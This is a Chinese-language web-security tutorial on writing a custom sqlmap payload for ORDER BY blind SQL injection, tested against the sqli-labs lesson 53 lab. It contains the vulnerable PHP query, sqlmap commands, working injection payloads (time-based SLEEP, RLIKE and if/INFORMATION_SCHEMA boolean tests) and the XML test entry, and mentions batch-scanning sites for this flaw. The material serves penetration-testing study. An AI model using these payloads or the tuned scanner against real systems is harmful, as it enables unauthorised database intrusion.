---
title: sqlmap使用之自定义payload
date: 2017-03-31 10:36:24
categories: Web安全
tags:
    - sqlmap
---

## 为什么要自定义payload

sqlmap根据用户提供的`level`和`risk`参数决定发送SQL注入测试的payload的种类和数量。通常情况，sqlmap使用默认参数扫描时会存在很多注入扫描不出来的问题，这是因为默认情况下一些注入类型(如`order by`)是不会去扫描的，虽然用户可以通过提高level参数和risk参数，让sqlmap做更加全面的扫描，但是这种方式会发送大量的请求，影响扫描效率，而且risk参数过高还会带来损害数据库的风险，因此可以通过添加自定义的payload或者修改sqlmap提供的payload，优化扫描策略。

自定义payload可以带来以下好处:

* 提供针对性的扫描，同时保持sqlmap扫描的高效性(发送的请求少)
* 针对已知的注入类型，做绕过测试，例如: 结合各种tamper脚本等

<!-- more -->

## 添加自定义payload

关于sqlmap生成payload的方式可以参见 {% post_link sqlmap源码解析之test和boundary组合生成payload sqlmap源码解析之test和boundary组合生成payload %}。

使用 sqli-lab 实验环境，选取lesson 53做测试，核心代码为:

```php
$id=$_GET['sort'];
if(isset($id)){
    $sql="SELECT * FROM users ORDER BY '$id'";
}
```

显然, 这是order by类型的注入，而且还是字符型注入。另外看具体代码知道，这题为盲注类型。首先使用sqlmap做默认扫描


```
sqlmap -u "http://sqli.loc/Less-52/?sort=1" -p sort -v 2

[14:21:19] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)' because the level (4) is higher than the provided (1)

sqlmap identified the following injection point(s) with a total of 93 HTTP(s) requests:
---
Parameter: sort (GET)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: sort=1' AND SLEEP(5) AND 'MAwe'='MAwe
    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
---
```

从上面的结果可以看出: 1. 默认`level=1`的情况下，sqlmap会忽略`ORDER BY`类型的测试。 2: sqlmap只发了93个请求，识别出了注入点，但是从title可以看出使用的payload并不是`ORDER BY`类型, 而且还是时间盲注,并不方便后续的数据获取。

提高`level`参数为4，再次测试

```
sqlmap -u "http://sqli.loc/Less-53/?sort=1" -p sort -v 2 --level 4

sqlmap identified the following injection point(s) with a total of 417 HTTP(s) requests:
---
Parameter: sort (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: sort=1' RLIKE (SELECT (CASE WHEN (1428=1428) THEN 1 ELSE 0x28 END))-- dtiw
    Vector: RLIKE (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 0x28 END))
---
```

sqlmap总共发送了417次请求, 但识别注入点的payload为包含`ORDER BY`类型的payload. 那么我们可以自定义添加payload或者修改该payload的level值为1，这样批量扫描注入点为这种类型的站点，节约扫描时间。

### 自定义payload

在 `xml/payloads/boolean_blind.xml`文件后添加test节点如下:

```xml
<test>
    <title>AND boolean-based blind - WHERE or HAVING or ORDER BY OR GROUP BY clause</title>
    <stype>1</stype>
    <level>1</level>
    <risk>1</risk>
    <clause>1,2,3</clause>
    <where>1</where>
    <vector>AND if([INFERENCE],[RANDNUM],(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS))</vector>
    <request>
        <payload>AND if([RANDNUM]=[RANDNUM],[RANDNUM],(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS))</payload>
    </request>
    <response>
        <comparison>AND if([RANDNUM]=[RANDNUM1],[RANDNUM],(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS))</comparison>
    </response>
</test>
```

识别结果如下，共292次请求，添加的payload成功识别。

```
python sqlmap.py -u http://sqli.loc/Less-53/?sort=1 -v 2

sqlmap identified the following injection point(s) with a total of 292 HTTP(s) requests:
---
Parameter: sort (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING or ORDER BY OR GROUP BY clause
    Payload: sort=1' AND if(9984=9984,9984,(SELECT 9984 FROM INFORMATION_SCHEMA.PLUGINS)) AND 'WKRv'='WKRv
    Vector: AND if([INFERENCE],[RANDNUM],(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS))

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: sort=1' AND SLEEP(5) AND 'rcfl'='rcfl
    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
---
```
